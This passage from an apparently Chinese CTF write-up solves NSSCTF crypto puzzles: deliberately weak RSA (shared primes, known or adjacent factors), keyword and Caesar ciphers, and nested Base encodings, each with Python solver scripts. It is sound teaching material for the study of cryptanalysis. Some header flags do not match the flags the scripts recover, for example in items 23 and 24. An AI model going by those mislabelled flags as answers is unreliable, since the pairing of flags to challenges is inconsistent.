class="line">    flag2 = invert(flag2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：恢复明文</span></span><br><span class="line">m = powmod(flag1, s, n) * powmod(flag2, t, n) % n</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密结果:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>NSSCTF{xxxxx******xxxxx}</p></blockquote><hr><h2 id="16-羊城杯-2021-Bigrsa"><a href="#16-羊城杯-2021-Bigrsa" class="headerlink" title="16 [羊城杯 2021]Bigrsa"></a>16 [羊城杯 2021]Bigrsa</h2><p>🚩flag：<code>NSSCTF{xxxxx******xxxxx}</code></p><p>💡hint：<code>共享素数</code> <code>RSA</code> <code>不互素</code></p><p>题目描述：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"c = %d"</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line">phi1 = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d1 = gmpy2.invert(e,phi1)</span><br><span class="line">d2 = gmpy2.invert(e,phi2)</span><br><span class="line">c1 = <span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></tbody></table></figure><blockquote><p>b’SangFor{qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8}’</p></blockquote><hr><h2 id="17-LitCTF-2023-家人们！谁懂啊，RSA签到都不会-初级"><a href="#17-LitCTF-2023-家人们！谁懂啊，RSA签到都不会-初级" class="headerlink" title="17 [LitCTF 2023]家人们！谁懂啊，RSA签到都不会 (初级)"></a>17 [LitCTF 2023]家人们！谁懂啊，RSA签到都不会 (初级)</h2><p>🚩flag：<code>NSSCTF{it_is_easy_to_solve_question_when_you_know_p_and_q}</code></p><p>💡hint： <code>RSA</code> <code>不互素</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'p = <span class="subst">{p}</span>'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'q = <span class="subst">{q}</span>'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'c = <span class="subst">{c}</span>'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span></span><br><span class="line"><span class="string">q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span></span><br><span class="line"><span class="string">c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><strong>题目分析</strong></p><p>给定：</p><ul><li>明文 <code>m</code> 经过 RSA 加密：<code>c = pow(m, e, n)</code></li><li>已知 <code>p</code>, <code>q</code>, <code>e</code>, <code>c</code>，需要恢复 <code>m</code></li></ul><p><strong>数学原理</strong></p><ol><li>计算 <code>n = p * q</code></li><li>计算欧拉函数 <code>φ(n) = (p-1) * (q-1)</code></li><li>计算私钥 <code>d = inverse(e, φ(n))</code></li><li>解密明文 <code>m = pow(c, d, n)</code></li></ol><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">p = <span class="number">12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span></span><br><span class="line">q = <span class="number">12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：计算n和欧拉函数</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：计算私钥d</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)  <span class="comment"># Python 3.8+ 语法，等同于 inverse(e, phi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：解密明文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤4：将明文转换为字符串</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密结果:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>解密结果: b’LitCTF{it_is_easy_to_solve_question_when_you_know_p_and_q}’</p></blockquote><hr><h2 id="18-LitCTF-2023-你是我的关键词-Keyworld-初级"><a href="#18-LitCTF-2023-你是我的关键词-Keyworld-初级" class="headerlink" title="18 [LitCTF 2023]你是我的关键词(Keyworld) (初级)"></a>18 [LitCTF 2023]你是我的关键词(Keyworld) (初级)</h2><p>🚩flag：<code>NSSCTF{Y0U_AR3_MY_KEYW0RD}</code></p><p>💡hint： <code>其他</code></p><p>关键字密码在线解密网站：</p><p><a href="http://www.hiencode.com/keyword.html">http://www.hiencode.com/keyword.html</a></p><p>注意这里解密密码是<code>you</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">LITCTF{Y0U_AR3_MY_KEYW0RD}</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="19-LitCTF-2023-Is-this-only-base"><a href="#19-LitCTF-2023-Is-this-only-base" class="headerlink" title="19 [LitCTF 2023]Is this only base?"></a>19 [LitCTF 2023]Is this only base?</h2><p>🚩flag：<code>NSSCTF{LeT_Us_H4V3_fU0!!!!!}</code></p><p>💡hint：<code> 栅栏密码</code> <code>凯撒密码</code> <code>Base家族</code></p><p>题目描述：</p><p>SWZxWl=F=DQef0hlEiSUIVh9ESCcMFS9NF2NXFzM<br>今年是本世纪的第23年呢</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始密文（W型栅栏解密后的结果）</span></span><br><span class="line">rail_fence_decrypted = <span class="string">"SWZxWlFDe0liUV9ScF9FNFMzX2NSMCEhISEhfQ=="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：Base64解码</span></span><br><span class="line">base64_decoded = base64.b64decode(rail_fence_decrypted).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Base64解码结果:"</span>, base64_decoded)  <span class="comment"># 输出: IfqZQC{IbQ_Rp_E4S3_cR0!!!}</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：凯撒解密（枚举所有偏移量）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext, shift</span>):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            ascii_offset = <span class="built_in">ord</span>(<span class="string">'A'</span>) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">'a'</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - ascii_offset - shift) % <span class="number">26</span> + ascii_offset)</span><br><span class="line">            result += decrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试所有可能的凯撒偏移（0-25）</span></span><br><span class="line"><span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    decrypted = caesar_decrypt(base64_decoded, shift)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"CTF"</span> <span class="keyword">in</span> decrypted:  <span class="comment"># 根据题目特征筛选</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"偏移量 <span class="subst">{shift}</span>: <span class="subst">{decrypted}</span>"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>LitCTF{LeT_Us_H4V3_fU0!!!!!}</p></blockquote><hr><h2 id="20-SWPU-2020-happy"><a href="#20-SWPU-2020-happy" class="headerlink" title="20 [SWPU 2020]happy"></a>20 [SWPU 2020]happy</h2><p>🚩flag：<code>NSSCTF{happy_rsa_1}</code></p><p>💡hint：<code>RSA</code> <code>素数分解</code> <code>共享素数</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">(<span class="comment">'c=', '0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL')</span></span><br><span class="line">(<span class="comment">'e=', '0x872a335')</span></span><br><span class="line">#q + q*p^<span class="number">3</span> =<span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">#qp + q *p^<span class="number">2</span> = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> paramiko.util <span class="keyword">import</span> mod_inverse</span><br><span class="line"></span><br><span class="line"><span class="comment">#A = q + q*p^3</span></span><br><span class="line"><span class="comment">#B = qp + q *p^2</span></span><br><span class="line">A = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">B = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line">c = <span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line">e = <span class="number">0x872a335</span></span><br><span class="line"><span class="comment">#通过换算，A和B的最大公因数是q(1+p)</span></span><br><span class="line">C = math.gcd(A,B)</span><br><span class="line"><span class="comment">#p * C = B</span></span><br><span class="line">p = B // C</span><br><span class="line">q = C // (<span class="number">1</span> + p)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="21-安洵杯-2019-JustBase"><a href="#21-安洵杯-2019-JustBase" class="headerlink" title="21 [安洵杯 2019]JustBase"></a>21 [安洵杯 2019]JustBase</h2><p>🚩flag：<code>NSSCTF{22-QWERTYUIO-PLKJHGFDS-AZXCVBNM}</code></p><p>💡hint：<code>base</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">VGhlIGdlb@xvZ#kgb@YgdGhlIEVhcnRoJ#Mgc#VyZmFjZSBpcyBkb@!pbmF)ZWQgYnkgdGhlIHBhcnRpY#VsYXIgcHJvcGVydGllcyBvZiB#YXRlci$gUHJlc@VudCBvbiBFYXJ)aCBpbiBzb@xpZCwgbGlxdWlkLCBhbmQgZ@FzZW(!cyBzdGF)ZXMsIHdhdGVyIGlzIGV$Y@VwdGlvbmFsbHkgcmVhY#RpdmUuIEl)IGRpc#NvbHZlcywgdHJhbnNwb#J)cywgYW%kIHByZWNpcGl)YXRlcyBtYW%%IGNoZW!pY@FsIGNvbXBvdW%kcyBhbmQgaXMgY@(uc#RhbnRseSBtb@RpZnlpbmcgdGhlIGZhY@Ugb@YgdGhlIEVhcnRoLiBFdmFwb#JhdGVkIGZyb@)gdGhlIG(jZWFucywgd@F)ZXIgdmFwb#IgZm(ybXMgY@xvdWRzLCBzb@!lIG(mIHdoaWNoIGFyZSB)cmFuc#BvcnRlZCBieSB#aW%kIG(@ZXIgdGhlIGNvbnRpbmVudHMuIENvbmRlbnNhdGlvbiBmcm(tIHRoZSBjbG(!ZHMgcHJvdmlkZXMgdGhlIGVzc@VudGlhbCBhZ@VudCBvZiBjb@%)aW%lbnRhbCBlcm(zaW(uOiByYWluLlRoZSByYXRlIGF)IHdoaWNoIGEgbW(sZWN!bGUgb@Ygd@F)ZXIgcGFzc@VzIHRob#VnaCB)aGUgY#ljbGUgaXMgbm()IHJhbmRvbQpBbmQgdGhlIGZsYWcgaXM^IENURnsyMi!RV)VSVFlVSU*tUExLSkhHRkRTLUFaWENWQk%NfQ==</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改为自己的base.txt文件路径</span></span><br><span class="line">my_file = <span class="string">'./justaBase/base.txt'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(my_file, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        my_str = file.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'文件读取成功，内容为'</span>, my_str)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"文件 '<span class="subst">{my_file}</span>' 未找到"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"读取文件时出错：<span class="subst">{e}</span>"</span>)</span><br><span class="line"></span><br><span class="line">my_dict = {<span class="string">'!'</span>: <span class="string">'1'</span>, <span class="string">'@'</span>: <span class="string">'2'</span>, <span class="string">'#'</span>: <span class="string">'3'</span>, <span class="string">'$'</span>: <span class="string">'4'</span>, <span class="string">'%'</span>: <span class="string">'5'</span>, <span class="string">'^'</span>: <span class="string">'6'</span>, <span class="string">'&amp;'</span>: <span class="string">'7'</span>, <span class="string">'*'</span>: <span class="string">'8'</span>, <span class="string">'('</span>: <span class="string">'9'</span>, <span class="string">')'</span>: <span class="string">'0'</span>}</span><br><span class="line">flag_str = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_str:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> my_dict:</span><br><span class="line">        flag_str += my_dict[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag_str += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"特殊符号替换后字符串为%s"</span> % flag_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"base64解码后字符串为%s"</span> % base64.b64decode(flag_str).decode())</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="22-AFCTF-2018-BASE"><a href="#22-AFCTF-2018-BASE" class="headerlink" title="22 [AFCTF 2018]BASE"></a>22 [AFCTF 2018]BASE</h2><p>🚩flag：<code>NSSCTF{U_5h0u1d_Us3_T00l5}</code></p><p>💡hint：<code>hex</code> <code>base</code></p><p>解题脚本：</p><p><strong>自动解码多层嵌套的 Base16/Base32/Base64 编码</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">"flag_encode.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">text = file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b16decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b64decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(text)</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="23-NSSCTF-2022-Spring-Recruit-classic"><a href="#23-NSSCTF-2022-Spring-Recruit-classic" class="headerlink" title="23 [NSSCTF 2022 Spring Recruit]classic"></a>23 [NSSCTF 2022 Spring Recruit]classic</h2><p>🚩flag：<code>NSSCTF{no_why}</code></p><p>💡hint：<code>base</code> <code>古典</code> <code>凯撒</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">UZZJAM{UIXETGR7TMWD42SKTCWEP4AG_mhrlmshnayfihzl}</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="string">"""自动凯撒解密并筛选有效结果"""</span></span><br><span class="line">    possible_flags = []</span><br><span class="line">    <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):  <span class="comment"># 尝试所有可能的偏移量</span></span><br><span class="line">        decrypted = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                decrypted += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">'A'</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'A'</span>))</span><br><span class="line">            <span class="keyword">elif</span> char.islower():</span><br><span class="line">                decrypted += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">'a'</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                decrypted += char  <span class="comment"># 保留非字母字符</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 筛选条件：包含常见 Flag 格式或可读单词</span></span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r'[A-Za-z]+\{.*\}'</span>, decrypted):</span><br><span class="line">            possible_flags.append((shift, decrypted))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> possible_flags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文输入</span></span><br><span class="line">ciphertext = <span class="string">"UZZJAM{UIXETGR7TMWD42SKTCWEP4AG_mhrlmshnayfihzl}"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密</span></span><br><span class="line">results = caesar_decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> results:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"未找到有效解密结果！"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"可能的 Flag（按优先级排序）："</span>)</span><br><span class="line">    <span class="keyword">for</span> shift, flag <span class="keyword">in</span> <span class="built_in">sorted</span>(results, key=<span class="keyword">lambda</span> x: -<span class="built_in">len</span>(x[<span class="number">1</span>])):  <span class="comment"># 按长度排序（越长越可能）</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"偏移量 <span class="subst">{shift}</span>: <span class="subst">{flag}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自动推荐最可能的结果</span></span><br><span class="line">    best_guess = <span class="built_in">max</span>(results, key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(re.findall(<span class="string">r'[A-Za-z0-9_]'</span>, x[<span class="number">1</span>])))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\n推荐结果（偏移量 <span class="subst">{best_guess[<span class="number">0</span>]}</span>）: <span class="subst">{best_guess[<span class="number">1</span>]}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>NSSCTF{NBQXMZK7MFPW42LDMVPXI4TZ_fakeflagtrybase}</p></blockquote><p>然后使用base自动解码脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件并读取内容</span></span><br><span class="line"><span class="comment">#file = open("flag_encode.txt", "r")</span></span><br><span class="line"><span class="comment">#text = file.read()</span></span><br><span class="line">text = <span class="string">"NBQXMZK7MFPW42LDMVPXI4TZ"</span></span><br><span class="line"><span class="comment"># 无限循环，直到解码失败</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试 Base16 解码</span></span><br><span class="line">        text = base64.b16decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Base16 失败后尝试 Base32</span></span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Base32 失败后尝试 Base64</span></span><br><span class="line">                text = base64.b64decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment"># 所有解码均失败，输出结果并退出循环</span></span><br><span class="line">                <span class="built_in">print</span>(text)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p>得到：</p><blockquote><p>have_a_nice_try</p></blockquote><hr><h2 id="24-SWPUCTF-2021-新生赛-crypto4"><a href="#24-SWPUCTF-2021-新生赛-crypto4" class="headerlink" title="24 [SWPUCTF 2021 新生赛]crypto4"></a>24 [SWPUCTF 2021 新生赛]crypto4</h2><p>🚩flag：<code>NSSCTF{have_a_nice_try}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">'**********'</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag= '</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n= '</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag= <span class="number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span></span><br><span class="line">n= <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt, next_prime, mpz</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">flag1 = <span class="number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span></span><br><span class="line">n = <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：分解n（利用p和q相邻的特性）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_n</span>(<span class="params">n</span>):</span><br><span class="line">    sqrt_n = isqrt(n)</span><br><span class="line">    p = sqrt_n</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> p, n // p</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p, q = factor_n(mpz(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"分解结果:"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"p ="</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"q ="</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：计算私钥d</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：解密明文</span></span><br><span class="line">m1 = <span class="built_in">pow</span>(flag1, d, n)</span><br><span class="line">flag = long_to_bytes(m1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"\n解密结果:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>分解结果:<br>p = 